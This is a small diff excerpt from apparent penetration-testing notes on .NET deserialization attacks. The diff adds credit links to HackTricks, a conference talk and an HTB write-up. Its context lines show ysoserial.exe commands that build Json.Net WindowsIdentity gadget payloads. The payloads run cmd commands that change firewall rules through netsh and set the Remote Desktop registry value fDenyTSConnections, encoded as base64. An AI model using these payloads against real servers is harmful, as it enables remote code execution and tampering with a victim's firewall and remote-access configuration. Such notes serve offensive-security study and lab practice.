@@ -49,3 +49,8 @@ ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c netsh advfirewall firewa
 ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f" -o base64
 
 ```
+
+
+* Credit@https://book.hacktricks.xyz/pentesting-web/deserialization
+* Credit@https://speakerdeck.com/pwntester/attacking-net-serialization?slide=5
+* Credit@https://0xdf.gitlab.io/2020/02/15/htb-json.html
